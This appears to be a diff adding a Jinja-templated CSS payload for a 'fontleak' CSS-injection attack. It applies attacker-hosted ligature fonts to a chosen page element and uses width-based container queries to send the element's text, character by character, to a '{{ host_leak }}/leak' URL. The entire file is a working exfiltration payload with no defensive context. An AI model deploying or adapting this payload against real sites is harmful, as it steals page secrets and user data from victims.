@@ -1,0 +1,100 @@
+* {
+    display: none !important;
+}
+
+html, body, head {
+    padding: 0!important;
+    margin: 0!important;
+    width: 0!important;
+    height: 0!important;
+    border: 0!important;
+    outline: 0!important;
+    line-height: 0!important;
+    position: relative !important;
+}
+
+html {
+    top: 0 !important;
+    left: 0 !important;
+    display: grid !important;
+    grid-template-columns: 1fr auto;
+    width: {{ html_width }}px !important;
+    will-change: content, transform !important;
+}
+
+head {
+    display: block !important;
+    container-type: size !important;
+    container-name: leak;
+    height: 100% !important;
+    width: 100% !important;
+    max-width: {{ html_width }}px !important;
+    background: blue !important;
+}
+
+/* Set up the head::after for reporting */
+head::after {
+    display: block !important;
+    width: 0px !important;
+    height: 0px !important;
+    position: absolute !important;
+    top: 0 !important;
+    left: 0 !important;
+    content: "";
+}
+
+body {
+    display: block !important;
+    width: auto !important;
+    height: auto !important;
+    position: static !important;
+}
+
+{% for i in range(idx_max) %}
+    @font-face {
+        font-family: 'fontleak{{ i }}';
+        src: url('{{ host }}/?step={{ i }}&id={{ id }}') format('opentype');
+        font-display: swap;
+    }
+{% endfor %}
+
+@font-face {
+    font-family: 'fontleak';
+    src: url('{{ host }}/font.ttf') format('opentype');
+}
+
+/* Target element styling */
+{{ leak_selector }} {
+    display: inline-block !important;
+    font-family: 'fontleak';
+    font-size: 1000px !important;
+    width: fit-content !important;
+    overflow: hidden !important;
+    white-space: normal !important;
+    letter-spacing: 0 !important;
+    line-height: 3px !important;
+    font-feature-settings: "rlig" on, "liga" on, "calt" on, "dlig" on !important;
+    text-rendering: optimizeLegibility !important;
+    -webkit-font-feature-settings: "rlig", "liga", "calt", "dlig" !important;
+    font-variant-ligatures: discretionary-ligatures !important;
+    background: skyblue !important;
+    will-change: content, transform !important;
+    position: relative !important;
+    animation: fontCycle {{ idx_max * 0.5 }}s steps(1) infinite 1s;
+}
+
+@keyframes fontCycle {
+    {% for i in range(idx_max) %}
+    {{ (i / idx_max) * 100 }}% {
+        font-family: 'fontleak{{ i }}', 'fontleak';
+    }
+    {% endfor %}
+}
+
+{% for container in width_containers %}
+@container leak (width: {{ container.width }}px) {
+    head::before {
+        content: var(--xd, var(--yo, url("{{ host_leak }}/leak?idx={{ container.char_idx }}&id={{ id }}")));
+    }
+}
+{% endfor %}
